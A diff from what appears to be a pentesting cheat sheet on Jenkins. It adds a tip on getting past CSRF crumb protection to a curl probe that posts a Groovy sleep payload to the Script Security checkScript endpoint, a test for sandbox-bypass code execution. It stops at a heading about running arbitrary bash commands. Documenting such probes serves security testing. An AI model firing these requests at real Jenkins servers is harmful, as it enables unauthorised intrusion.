@@ -67,6 +67,7 @@ Check if a Jenkins instance is vulnerable (needs Overall/Read permissions) with 
 ```bash
 curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){sleep(5000)}}'
 ```
+*Note: If you get a 403 error complaining about a missing crumb (which is a CSRF protection in Jenkins), you may be able to get the crumb value with a GET request to `https://example.com/crumbIssuer/api/json`. The crumb value shall then be added to the POST request in a `Jenkins-Crumb` Header.*
 
 Execute arbitraty bash commands:
 ```bash
